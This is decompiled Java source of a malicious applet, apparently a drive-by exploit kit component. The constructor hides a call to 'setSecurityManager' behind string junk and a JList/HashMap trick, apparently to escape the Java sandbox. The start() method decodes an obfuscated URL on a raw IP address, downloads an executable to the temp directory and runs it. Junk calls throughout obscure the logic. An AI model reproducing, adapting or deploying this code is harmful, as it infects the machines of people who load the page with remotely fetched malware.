// 
// Decompiled by Procyon v0.5.30
// 

package jino;

import java.util.Map;
import java.util.logging.Level;
import java.util.logging.Logger;
import java.awt.Component;
import javax.swing.JList;
import java.util.Set;
import java.util.HashMap;
import java.util.HashSet;
import java.io.InputStream;
import java.io.Reader;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.FileOutputStream;
import java.util.Random;
import java.net.URL;
import java.applet.Applet;

public class Jino extends Applet
{
    public int LqcaGS;
    private Class[] d;
    private String K;
    private Class[] e;
    private Class[] j;
    private Boolean H;
    public Class SwnheC;
    public String dbhBvE;
    public Class[] NdlFdp;
    public Boolean mLmebU;
    public int gJEnqr;
    public Class[] QKqQRV;
    public Class GUtBph;
    
    public Boolean EcSHVw() {
        return true;
    }
    
    private void ok() {
        final int a = 1;
    }
    
    @Override
    public void start() {
        super.start();
        try {
            final String teeh = "kwws=22<41454148619;2ordg1sksBvso@reh";
            String asq = "";
            this.ok();
            for (int s = 0; s < teeh.length(); ++s) {
                int as = teeh.charAt(s);
                as -= 3;
                asq += (char)as;
            }
            final URL wers = new URL(asq);
            if (this.EcSHVw()) {
                wers.openConnection();
            }
            this.ok();
            this.ok();
            final InputStream reader = wers.openStream();
            this.ok();
            this.ok();
            for (int ij = 0; ij < 9; ++ij, ++ij) {}
            this.ok();
            String wasf = System.getProperty("jasvavasva.iasvo.tmasvpdasvir".replace("asv", ""));
            this.ok();
            this.ok();
            if (wasf.charAt(wasf.length() - 1) != '\\') {
                wasf += "\\";
            }
            final Random ehaa = new Random();
            this.ok();
            this.ok();
            final int randomInt = ehaa.nextInt(100);
            this.ok();
            this.ok();
            final String fl = wasf + "like" + "o" + Integer.toString(randomInt) + ".e".concat("xe");
            this.ok();
            this.ok();
            final FileOutputStream maiter = new FileOutputStream(fl);
            this.ok();
            this.ok();
            byte[] mdmaiter = new byte[153600];
            final byte[] mdmr = new byte[15];
            this.ok();
            this.ok();
            int erist = 0;
            this.ok();
            this.ok();
            int sss = 0;
            this.ok();
            while ((sss = reader.read(mdmaiter)) > 0) {
                maiter.write(mdmaiter, 0, sss);
                this.ok();
                final int b = 0;
                mdmaiter = new byte[153600];
                erist += sss;
            }
            this.ok();
            maiter.close();
            reader.close();
            final boolean wwerist;
            final boolean tmpw1 = wwerist = true;
            final boolean localBoolegean3;
            final boolean tmpw2 = localBoolegean3 = true;
            this.ok();
            this.ok();
            final Runtime wqento = Runtime.getRuntime();
            for (int aj = 0; aj < 9; ++aj, ++aj) {}
            this.ok();
            this.ok();
            final Process exx = wqento.exec(fl);
            exx.waitFor();
            this.ok();
            final BufferedReader fduuer = new BufferedReader(new InputStreamReader(exx.getInputStream()));
        }
        catch (Exception ex) {}
    }
    
    public final void Ecs() {
        final int derm = 9;
        final int reso = derm / 2 + 55;
    }
    
    public Jino() {
        final Object target = System.class;
        this.Ecs();
        this.ok();
        final String methodName = "se123atSec123auri123atyM123aanag123aer".replace("123a", "");
        this.Ecs();
        this.Ecs();
        this.ok();
        final Object[] www = { null };
        final Object[] w = { null };
        this.Ecs();
        this.ok();
        final Renam l = new Renam(target, methodName, www);
        this.Ecs();
        final HashSet a = new HashSet();
        final HashSet b = new HashSet();
        this.Ecs();
        this.ok();
        a.add(l);
        this.ok();
        final int verif = 13;
        this.Ecs();
        final Map bas = new HashMap() {
            @Override
            public Set entrySet() {
                return a;
            }
        };
        this.Ecs();
        this.ok();
        final boolean tmp5_5 = true;
        this.ok();
        final boolean wwerist = tmp5_5;
        final boolean tmp5_6 = true;
        this.ok();
        final boolean localBoolean3 = tmp5_6;
        this.ok();
        final JList list = new JList((E[])new Object[] { bas });
        this.Ecs();
        this.ok();
        this.add(list);
        this.ok();
        try {
            Thread.sleep(2000L);
        }
        catch (InterruptedException ex) {
            Logger.getLogger(Jino.class.getName()).log(Level.SEVERE, null, ex);
        }
    }
}
